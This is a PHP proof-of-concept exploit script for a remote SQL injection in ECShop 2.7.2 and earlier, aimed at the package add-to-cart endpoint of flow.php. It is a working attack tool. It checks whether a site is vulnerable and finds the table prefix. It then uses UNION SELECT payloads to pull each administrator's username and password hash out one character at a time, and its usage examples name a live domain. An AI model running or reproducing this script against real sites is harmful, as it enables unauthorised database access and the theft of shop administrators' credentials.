<?php
/* 
 * P.O.C. by xsser - http://www.wooyun.org/bug.php?action=view&id=248
 */
error_reporting(E_ALL  & ~E_WARNING);
ini_set('display_errors', '1');
@set_time_limit(0);

hr();
banner();
if (count($argv) < 4 || $argv[1]=='?') 
{
	usage();
	exit;
}
hr();

$host = $argv[1];
$path = $argv[2];
$package_id = $argv[3];

$username = array();
$password = array();

exploit($host, $path);
print "Getting database prefix ...\n";
$pre = prefix($host, $path);
define('PRE',$pre);
print "Verifying package id ...\n";
valid($host, $path, $package_id);
print "Counting admin user ...\n";
$ucount = ucount($host, $path, $package_id);
print "Admin Users : $ucount\n";
for ($i=1;$i<=$ucount;$i++)
{
	print "Finding length of username for admin $i ...\n";
	$length = length($host, $path, $package_id, $i);
	print "Lenght : $length\n";
	print "Finding username for admin $i ...\n";
	print "Username : ";
	$username[$i] = getUser($host, $path, $package_id, $i, $length);
	print "\n";
	print "Finding password for admin $i ...\n";
	print "Password : ";
	$password[$i] = getPass($host, $path, $package_id, $i);
	print "\n";
}
	hr();
	print "*\n";
	print "* [+] Target Host   : $host$path\n";
	print "* [+] Admin Founded : $ucount\n";
	print "*\n";
for ($i=1;$i<=$ucount;$i++)
{
	print "* [+] Username : " . $username[$i] . "\n";
	print "*     Passowrd : " . $password[$i] . "\n";
	print "*\n";
}
	hr();

function hr()
{
	print "****************************************************************************\n";
}

function banner()
{
	print "* [+] Exploit      : ECShop <= 2.7.2 (lib_common.php) Remote SQL Injection *\n";
    print "* [+] Date         : 22-08-2010                                            *\n";
    print "* [+] Author       : alibaba                                               *\n";
	print "* [+] QQ           : 1499281192                                            *\n";
	print "* [+] Requirement  : Selling Package                                       *\n";
}

function usage($argv0)
{
	hr();
	print "* [+] Usage   : php package.php <host> <path> <package id>                 *\n";
	print "* [+] Example : php package.php www.ecshop.com / 1                         *\n";
	print "* [+] Example : php package.php www.ecshop.com /shop/ 1                    *\n";
	hr();
}

function exploit($host, $path)
{
	$url = $path . 'flow.php?step=add_package_to_cart';
	$data = 'package_info={"package_id":"1\'","number":"1"}';
	$buffer = POST($host,80,$url,$data,30);
	if (!strrpos($buffer,"MySQL server error report"))
		die("No Vulnerability");
	else
		print "Vulnerability Founded!\n";
}

function prefix($host, $path)
{
	$url = $path . "flow.php?step=add_package_to_cart";
	$data = 'package_info={"package_id":"1 and 1=2 union all select 1,2,1,4,5,6,1,8,9,0 from ecs_admin_user--","number":"1"}';
	$buffer = POST($host,80,$url,$data,30);
	if (!strrpos($buffer,"MySQL server error report"))
		$pre = 'ecs_';
	else
	{
		preg_match("/Table \'(.+)\.(.+)admin_user\' doesn't exist/i",$buffer,$m);
		$pre = isset($m[2])? $m[2] : '';
	}
	return $pre;
}

function valid($host, $path, $package_id)
{
	$url = $path . "flow.php?step=add_package_to_cart";
	$data = 'package_info={"package_id":"' . $package_id . ' and 1=2 union all select 1,2,1,4,5,6,1,8,9,0 from ' . PRE . 'admin_user--","number":"1"}';
	$buffer = POST($host,80,$url,$data,30);
	if (strrpos($buffer,'{"error":3'))
		die("Invalid Package Id or Package Expired!\n");
}

function ucount($host, $path, $package_id)
{
	$url = $path . "flow.php?step=add_package_to_cart";
	$data = 'package_info={"package_id":"' . $package_id . ' and 1=2 union all select 1,2,1,4,5,6,1,8,9,0 from ' . PRE . 'admin_user--","number":"1"}';
	$buffer = POST($host,80,$url,$data,30);
	
	preg_match_all ("|'(.*)+',|U", $buffer, $m);
	preg_match("/\'(.+)\'/i",$m[0][5],$int);
	return $int[1];
}

function length($host, $path, $package_id, $number)
{
	$number--;
	$url = $path . "flow.php?step=add_package_to_cart";
	$data = 'package_info={"package_id":"' . $package_id . ' and 1=2 union all select user_id,2,1,4,5,6,length(user_name),8,9,0 from ' . PRE . 'admin_user order by package_id limit ' . $number . ',1--","number":"1"}';
	$buffer = POST($host,80,$url,$data,30);
	preg_match_all ("|'(.*)+',|U", $buffer, $m);
	preg_match("/\'(.+)\'/i",$m[0][5],$int);
	return $int[1];
}

function getUser($host, $path, $package_id, $number, $length)
{
	$number--;
	$username = '';
	$url = $path . "flow.php?step=add_package_to_cart";
	for ($i=1;$i<=$length;$i++)
	{
		$data = 'package_info={"package_id":"' . $package_id . ' and 1=2 union all select user_id,2,1,4,5,6,ascii(substring(user_name,' . $i . ',1)),8,9,0 from ecs_admin_user order by package_id limit ' . $number . ',1--","number":"1"}';
		$buffer = POST($host,80,$url,$data,30);
		preg_match_all ("|'(.*)+',|U", $buffer, $m);
		preg_match("/\'(.+)\'/i",$m[0][5],$int);
		echo chr($int[1]);
		$username .= chr($int[1]);
	}
	return $username;
}

function getPass($host, $path, $package_id, $number)
{
	$number--;
	$password = '';
	
	$url = $path . "flow.php?step=add_package_to_cart";
	for ($i=1;$i<=32;$i++)
	{
		$data = 'package_info={"package_id":"' . $package_id . ' and 1=2 union all select user_id,2,1,4,5,6,ascii(substring(password,' . $i . ',1)),8,9,0 from ecs_admin_user order by package_id limit ' . $number . ',1--","number":"1"}';
		$buffer = POST($host,80,$url,$data,30);
		preg_match_all ("|'(.*)+',|U", $buffer, $m);
		preg_match("/\'(.+)\'/i",$m[0][5],$int);
		echo chr($int[1]);
		$password .= chr($int[1]);
	}
	return $password;
}

function POST($host,$port,$path,$data,$timeout, $cookie='') {
	$buffer='';

    $fp = fsockopen($host,$port,$errno,$errstr,$timeout);
    if(!$fp) die($host.'/'.$path.' : '.$errstr.$errno); 
	else {
        fputs($fp, "POST $path HTTP/1.0\r\n");
        fputs($fp, "Host: $host\r\n");
        fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
        fputs($fp, "Content-length: ".strlen($data)."\r\n");
        fputs($fp, "Connection: close\r\n\r\n");
        fputs($fp, $data."\r\n\r\n");
       
		while(!feof($fp)) 
		{
			$buffer .= fgets($fp,4096);
		}
		
		fclose($fp);
    } 
	return $buffer;
} 
?>